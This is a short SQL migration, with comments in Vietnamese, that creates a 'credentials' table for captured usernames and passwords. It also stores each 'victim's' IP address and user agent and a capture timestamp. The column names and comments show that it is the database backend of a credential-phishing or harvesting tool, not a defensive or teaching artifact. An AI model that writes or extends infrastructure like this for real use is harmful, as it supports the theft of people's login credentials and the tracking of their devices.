-- db/migrations/<timestamp>_create_credentials_table.sql
-- Lệnh Up: Tạo bảng credentials
CREATE TABLE credentials (
    id UUID PRIMARY KEY, -- Dùng UUID làm khóa chính để tránh đoán được ID
    username VARCHAR NOT NULL,
    password VARCHAR NOT NULL,
    victim_ip VARCHAR, -- Địa chỉ IP của nạn nhân (có thể lấy từ request)
    user_agent TEXT, -- Thông tin User-Agent của nạn nhân (có thể lấy từ request)
    captured_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP -- Thời gian thu thập
);

-- Lệnh Down: Xóa bảng credentials (để rollback migration)
--DROP TABLE credentials;-- Add migration script here
